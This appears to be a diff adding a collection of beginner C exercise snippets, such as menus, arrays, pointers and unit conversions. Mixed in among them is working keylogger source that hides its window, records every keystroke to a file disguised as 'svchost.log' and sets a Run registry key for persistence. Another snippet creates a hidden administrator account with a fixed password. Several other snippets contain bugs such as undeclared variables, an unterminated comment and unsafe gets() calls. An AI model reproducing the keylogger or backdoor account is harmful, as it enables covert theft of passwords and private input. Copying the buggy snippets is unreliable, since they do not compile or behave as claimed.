+    choice = get_menu_choice();
+
+    printf("You chose Menu Option %d\n", choice);
+
+    return 0;
+}
+
+int get_menu_choice(void)
+{
+    int selection = 0;
+
+    do{
+        printf("\n");
+        printf("\n1 - Add a Record");
+        printf("\n2 - Change a record");
+        printf("\n3 - Delete a record");
+        printf("\n4 - Quit");
+        printf("\n");
+        printf("\nEnter a selection: ");
+
+        scanf("%d", &selection);
+    }while (selection < 1 || selection > 4);
+
+    return selection;
+}
+
+
+----------------
+/* Using arrays, for, and while loops./*
+
+#include <stdio.h>
+
+int array[];
+
+int main (void)
+
+{
+    int ctr = 0,
+     nbr = 0;
+
+    printf("This program prompts you to enter 10 numbers\n");
+    printf("Each number should be from 1 to 100\n");
+
+    while (ctr < 10)
+    {
+        nbr = 0;
+        while (nbr < 1 || nbr > 100)
+        {
+            printf("\nEnter number %d of 10: ", ctr + 1);
+            scanf("%d", &nbr);
+        }
+        array[ctr] = nbr;
+        ctr++;
+
+    }
+    for (ctr = 0; ctr < 10; ctr++)
+        printf("Value %d is %d\n", ctr + 1, array[ctr] );
+
+    return 0;
+}
+
+
+
+--------------
+#include<Windows.h>
+#include<stdio.h>
+#include<winuser.h>
+#include<windowsx.h>
+#ifdef _WIN32
+#else
+#include <unistd.h>
+#endif
+
+#define BUFSIZE 80
+
+int
+test_key(
+void
+);
+int
+create_key(
+char
+*);
+int
+get_keys(
+void
+);
+
+int
+main(
+void
+)
+{
+
+HWND
+stealth;
+/*creating stealth (window is not visible)*/
+
+AllocConsole();
+
+stealth=FindWindowA(
+"ConsoleWindowClass"
+,NULL);
+
+ShowWindow(stealth,0);
+
+
+int
+test,create;
+
+test=test_key();
+/*check if key is available for opening*/
+
+
+if
+(test==2)
+/*create key*/
+
+{
+
+char
+*path=
+"c:\\%windir%\\svchost.exe"
+;
+/*the path in which the file needs to be*/
+
+create=create_key(path);
+
+
+}
+
+
+int
+t=get_keys();
+
+
+return
+t;
+}
+
+int
+get_keys(
+void
+)
+{
+
+short
+character;
+
+while
+(1)
+
+{
+
+Sleep(10);
+/*to prevent 100% cpu usage*/
+
+for
+(character=8;character<=222;character++)
+
+{
+
+if
+(GetAsyncKeyState(character)==-32767)
+
+{
+
+
+FILE
+*file;
+
+file=
+fopen
+(
+"svchost.log"
+,
+"a+"
+);
+
+if
+(file==NULL)
+
+{
+
+return
+1;
+
+}
+
+if
+(file!=NULL)
+
+{
+
+if
+((character>=39)&&(character<=64))
+
+{
+
+fputc
+(character,file);
+
+fclose
+(file);
+
+break
+;
+
+}
+
+else
+if
+((character>64)&&(character<91))
+
+{
+
+character+=32;
+
+fputc
+(character,file);
+
+fclose
+(file);
+
+break
+;
+
+}
+
+else
+
+{
+
+switch
+(character)
+
+{
+
+case
+VK_SPACE:
+
+fputc
+(
+' '
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_SHIFT:
+
+fputs
+(
+"[SHIFT]"
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_RETURN:
+
+fputs
+(
+"\n[ENTER]"
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_BACK:
+
+fputs
+(
+"[BACKSPACE]"
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_TAB:
+
+fputs
+(
+"[TAB]"
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_CONTROL:
+
+fputs
+(
+"[CTRL]"
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_DELETE:
+
+fputs
+(
+"[DEL]"
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_OEM_1:
+
+fputs
+(
+"[;:]"
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_OEM_2:
+
+fputs
+(
+"[/?]"
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_OEM_3:
+
+fputs
+(
+"[`~]"
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_OEM_4:
+
+fputs
+(
+"[ [{ ]"
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_OEM_5:
+
+fputs
+(
+"[\\|]"
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_OEM_6:
+
+fputs
+(
+"[ ]} ]"
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_OEM_7:
+
+fputs
+(
+"['\"]"
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_NUMPAD0:
+
+fputc
+(
+'0'
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_NUMPAD1:
+
+fputc
+(
+'1'
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_NUMPAD2:
+
+fputc
+(
+'2'
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_NUMPAD3:
+
+fputc
+(
+'3'
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_NUMPAD4:
+
+fputc
+(
+'4'
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_NUMPAD5:
+
+fputc
+(
+'5'
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_NUMPAD6:
+
+fputc
+(
+'6'
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_NUMPAD7:
+
+fputc
+(
+'7'
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_NUMPAD8:
+
+fputc
+(
+'8'
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_NUMPAD9:
+
+fputc
+(
+'9'
+,file);
+
+fclose
+(file);
+
+break
+;
+
+case
+VK_CAPITAL:
+
+fputs
+(
+"[CAPS LOCK]"
+,file);
+
+fclose
+(file);
+
+break
+;
+
+default
+:
+
+fclose
+(file);
+
+break
+;
+
+}
+
+}
+
+}
+
+}
+
+}
+
+
+}
+
+return
+EXIT_SUCCESS;
+}
+
+int
+test_key(
+void
+)
+{
+
+int
+check;
+
+HKEY
+hKey;
+
+char
+path[BUFSIZE];
+
+DWORD
+buf_length=BUFSIZE;
+
+int
+reg_key;
+
+
+reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+,0,KEY_QUERY_VALUE,&hKey);
+
+if
+(reg_key!=0)
+
+{
+
+check=1;
+
+return
+check;
+
+}
+
+
+reg_key=RegQueryValueEx(hKey,
+"svchost"
+,NULL,NULL,(
+LPBYTE
+)path,&buf_length);
+
+
+if
+((reg_key!=0)||(buf_length>BUFSIZE))
+
+check=2;
+
+if
+(reg_key==0)
+
+check=0;
+
+
+RegCloseKey(hKey);
+
+return
+check;
+}
+
+int
+create_key(
+char
+*path)
+{
+
+int
+reg_key,check;
+
+
+HKEY
+hkey;
+
+
+reg_key=RegCreateKey(HKEY_LOCAL_MACHINE,
+"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+,&hkey);
+
+if
+(reg_key==0)
+
+{
+
+RegSetValueEx((
+HKEY
+)hkey,
+"svchost"
+,0,REG_SZ,(
+BYTE
+*)path,
+strlen
+(path));
+
+check=0;
+
+return
+check;
+
+}
+
+if
+(reg_key!=0)
+
+check=1;
+
+
+return
+check;
+}
+
+
+----------------------
+#include <stdio.h>
+
+int main(void)
+
+{
+
+    system("cmd.exe /c net user test 12345 /add");
+
+    system("cmd.exe /c net localgroup administrators test /add");
+    
+
+
+    return 0;
+}
+----------------------
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(void)
+{
+    int total = 5;
+    int *ptr = &total;
+
+    printf("The total is: %p", ptr);
+    return 0;
+}
+
+---------------------------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <dos.h>
+
+
+int main(void)
+{
+    unsigned int x = 1;
+    unsigned int *my_pointer = &x;
+    for ( x < 1; x < 297; x++)
+
+   {
+
+
+
+        printf("#%i ", x);
+
+        printf("%p", my_pointer);
+
+
+        printf(":%i\n ", *my_pointer);
+
+        my_pointer = my_pointer + 1;
+
+}
+
+
+return 0;
+}
+
+------------------------
+
+int *p = (int *)0x14ed2d4;
+
+-------------
+
+#include <stdio.h>
+
+int main(void){
+
+char string[] = "Hello reddit";
+
+char *ptr = string;
+
+printf("The new string is: %s", string);
+
+*ptr = 'H';
+ptr = ptr + 1;
+*ptr = 'E';
+ptr = ptr + 1;
+*ptr = 'L';
+ptr = ptr + 1;
+*ptr = 'L';
+ptr = ptr + 1;
+*ptr = 'O';
+
+printf("The new string is: %s", string);
+
+return 0;
+
+}
+-----------------------------
+
+#include <stdio.h>
+#include <stdlib.h>  /* For exit() function */
+int main(void)
+{
+   char c[1000];
+   FILE *fptr;
+   FILE *test;
+   FILE *desc;
+   fptr=fopen("Name.txt","w");
+   test=fopen("Age.txt","w");
+   desc=fopen("Descript.txt","w");
+   if(fptr==NULL){
+      printf("Error!");
+      exit(1);
+   }
+   printf("Name:\n");
+   gets(c);
+   fprintf(fptr,"%s",c);
+   fclose(fptr);
+
+   if(test==NULL){
+      printf("Error!");
+      exit(1);
+   }
+   printf("Age:\n");
+   gets(c);
+   fprintf(test,"%s",c);
+   fclose(test);
+
+   if(desc==NULL){
+      printf("Error!");
+      exit(1);
+   }
+   printf("Description:\n");
+   gets(c);
+   fprintf(desc,"%s",c);
+   fclose(desc);
+
+
+return 0;
+}
+-------------------------
+
+#include <stdio.h>
+
+int main()
+{
+    int this_is_a_number;
+
+    printf( "Please enter a number: " );
+    scanf( "%d", &this_is_a_number );
+    printf( "You entered %d", this_is_a_number );
+    getchar();
+    return 0;
+}
+
+----------------------
+
+#include <stdio.h>
+
+float radius, area;
+
+int main(void)
+{
+    printf("Enter radius:");
+    scanf( "%f", &radius);
+    area = (float) (3.14159 * (radius * radius));
+    printf("\n\nArea = %f\n", area);
+    return 0;
+}
+
+--------------
+/* calculate age in 2015 and weight in grams from pounds*/
+#include <stdio.h>
+
+#define grams_per_pound 454
+
+const int target_year = 2015;
+
+int weight_in_grams, weight_in_pounds;
+
+int year_of_birth, age_in_2015;
+
+int main(void)
+{
+    printf("Enter your weight in pounds:");
+    scanf("%d", &weight_in_pounds);
+    printf("Enter your year of birth:");
+    scanf("%d", &year_of_birth);
+
+    weight_in_grams = weight_in_pounds * grams_per_pound;
+    age_in_2015 = target_year - year_of_birth;
+
+    printf("\nYour weight in grams = %1d", weight_in_grams);
+    printf("\nIn 2015 you will be %d years old\n", age_in_2010);
+
+    return 0;
+
+}
+-------------------
+ounces to grams conversion
+------------
+
+/*  Program to convert ounces to grams */
+
+#include <stdio.h>
+
+const float grams_in_an_ounce = 28.3495;
+int ounces;
+float grams;
+int main(void)
+{
+    printf("Enter the number of ounces you wish to convert to grams:");
+    scanf("%i", &ounces);
+    grams = ounces * grams_in_an_ounce;
+    printf("%d ounces is %f grams", ounces, grams);
+
+    return 0;
+}
+/*  End program */
+
+-----------
+/*Program for showing the size of different variable types and demonstrating how an array is the element number times the variable type size in bytes*/
+#include <stdio.h>
+
+int intarray[100];
+float floatarray[100];
+double doublearray[100];
+
+int main()
+{
+    printf("\n\nSize of int = %d bytes", sizeof(int));
+    printf("\nSize of short = %d bytes", sizeof(short));
+    printf("\nSize of long = %d bytes", sizeof(long));
+    printf("\nSize of long long = %d bytes", sizeof(long long));
+    printf("\nSize of float = %d bytes", sizeof(float));
+    printf("\nSize of double = %d bytes", sizeof(double));
+
+    printf("\nSize of intarray = %d bytes", sizeof(intarray));
+    printf("\nSize of floatarray = %d bytes", sizeof(floatarray));
+    printf("\nSize of doublearray = %d bytes", sizeof(doublearray));
+
+    return 0;
+
+}
+
